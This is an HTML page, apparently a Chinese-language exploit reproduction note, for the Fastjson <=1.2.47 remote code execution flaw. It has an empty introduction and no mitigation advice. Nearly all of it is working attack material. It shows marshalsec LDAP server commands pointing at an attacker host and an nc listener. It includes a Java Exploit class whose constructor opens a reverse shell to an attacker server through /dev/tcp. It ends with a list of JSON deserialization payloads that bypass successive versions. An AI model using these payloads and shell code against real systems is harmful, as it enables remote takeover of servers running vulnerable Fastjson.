<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs85AEE28A{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:italic;}
			.csBC8FD25D{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:italic;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="fastjson-1247-远程代码执行漏洞"><span class="csDE05BCC">Fastjson &lt;=1.2.47 </span><span class="csECDA2D3">远程代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Fastjson &lt; 1.2.47</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">https://github.com/ianxtianxt/fastjson-1.2.47-RCE-1</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">执行：</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IPvps/#Exploit</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">修改反弹</span><span class="cs8926E06">ip</span><span class="cs9C1B1871">和端口：</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">vim Exploit.java</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">编译生成</span><span class="cs8926E06">class</span><span class="cs9C1B1871">：</span><span class="cs8926E06">//</span><span class="cs7FFD2630">需要使用</span><span class="cs9FB05234">jdk1.8</span><span class="cs7FFD2630">，否则会报错</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">javac Exploit.java</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">开启</span><span class="cs8926E06">http</span><span class="cs9C1B1871">服务：</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">python3 -m http.server 80 </span><span class="cs7FFD2630">或者</span><span class="cs9FB05234"> python -m SimpleHTTPServer 80</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">payload:</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">开启</span><span class="cs8926E06">nc</span><span class="cs9C1B1871">监听反弹：</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">nc -lvvp 8888</span></p><h3 class="cs868C439D">
			<a name="反弹shell-poc补充"><span class="csD6CA00D2">反弹</span><span class="csD1E291E2">shell poc</span><span class="csD6CA00D2">补充</span></a></h3>
		<h4 class="cs868C439D">
			<a name="X43d72b29eff84095ee8a1460b4dc936361e9fb9"><span class="cs85AEE28A">java</span><span class="csBC8FD25D">反弹</span><span class="cs85AEE28A">shell</span><span class="csBC8FD25D">，无法直接使用</span><span class="cs85AEE28A">bash -i &gt;&amp; /dev/tcp/</span><span class="csBC8FD25D">攻击服务器</span><span class="cs85AEE28A">ip/8888 0&gt;&amp;1</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">import java.io.BufferedReader;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.InputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.InputStreamReader;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class Exploit{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public Exploit() throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process p = Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/</span><span class="cs7FFD2630">攻击服务器</span><span class="cs9FB05234">ip/888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;});</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream is = p.getInputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String line;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while((line = reader.readLine()) != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(line);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.waitFor();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;is.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reader.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.destroy();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void main(String[] args) throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h3 class="cs868C439D">
			<a name="补充"><span class="csD6CA00D2">补充</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">https://github.com/ianxtianxt/Fastjson-1.2.47-rce</span></p><p class="cs3A447A38"><span class="cs9FB05234">1.2.24</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;, &quot;autoCommit&quot;:true}}</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">未知版本</span><span class="cs9FB05234">(1.2.24-41</span><span class="cs7FFD2630">之间</span><span class="cs9FB05234">)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1.2.41</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{&quot;@type&quot;:&quot;Lcom.sun.rowset.RowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1.2.42</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true};</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1.2.43</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[{&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true]}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1.2.45</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:{&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;}}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1.2.47</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}}}</span></p></body>
</html>
